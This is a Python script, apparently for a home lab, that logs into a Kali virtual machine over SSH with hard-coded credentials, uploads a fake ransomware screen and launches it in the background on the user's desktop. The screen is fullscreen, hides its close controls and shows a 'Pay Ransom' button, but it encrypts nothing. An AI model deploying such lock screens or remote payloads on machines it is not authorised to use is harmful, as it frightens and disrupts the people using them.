#!/usr/bin/env python3
import sys
import paramiko
import time

# --- LAB CREDENTIALS ---
TARGET_IP = "172.16.2.101"
USERNAME = "kali"  # Replace with the actual Kali username
PASSWORD = "kalipassword" # Replace with the actual Kali password

def main():
    print(f"[*] Preparing to deploy payload to {TARGET_IP}...")

    # We use Tkinter for the GUI because it is built into Python by default
    payload_script = """#!/usr/bin/env python3
import tkinter as tk
import sys

def pay_ransom():
    lbl.config(text="Decrypting...")
    root.update()
    import time
    for i in range(0, 101, 10):
        lbl.config(text=f"Decrypting your files... {i}%")
        root.update()
        time.sleep(0.2)
    root.destroy()

root = tk.Tk()
root.attributes('-fullscreen', True)
root.configure(background='black')
root.overrideredirect(True) # Removes window borders/close buttons

lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\nClick below to end.", 
               fg="lime", bg="black", font=("Courier", 30, "bold"))
lbl.pack(expand=True)

btn = tk.Button(root, text="Pay Ransom", command=pay_ransom, 
                bg="darkred", fg="white", font=("Courier", 20, "bold"))
btn.pack(side="bottom", pady=50)

# Attempt to block ALT+F4
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.mainloop()
"""

    try:
        # 1. Connect to the Kali VM via SSH
        print("[*] Connecting via SSH...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD)
        
        # 2. Upload the payload script
        print("[*] Uploading payload to /tmp/ransom_sim.py...")
        sftp = ssh.open_sftp()
        with sftp.file('/tmp/ransom_sim.py', 'w') as f:
            f.write(payload_script)
        # Make it executable
        ssh.exec_command("chmod +x /tmp/ransom_sim.py")
        sftp.close()

        # 3. Execute the payload on the active display
        print("[*] Triggering GUI on active display...")
        
        # We need to find the active user's display and XAUTHORITY
        # This command finds the process for the desktop and uses its environment
        find_display_cmd = "who | grep -m 1 '(:[0-9])' | awk '{print $2}'"
        stdin, stdout, stderr = ssh.exec_command(find_display_cmd)
        display = stdout.read().decode().strip()
        
        if not display:
            print("[-] Could not find an active desktop session (are you logged in?).")
            ssh.close()
            sys.exit(1)
            
        print(f"[+] Found active display: {display}")

        # Run the script in the background targeting the correct display
        # We use nohup and & to detach it so it stays open after SSH closes
        exec_cmd = f"export DISPLAY={display}; export XAUTHORITY=/home/{USERNAME}/.Xauthority; nohup python3 /tmp/ransom_sim.py > /dev/null 2>&1 &"
        ssh.exec_command(exec_cmd)
        
        print("[+] Attack simulation launched. Check the Kali VM screen!")
        ssh.close()

    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
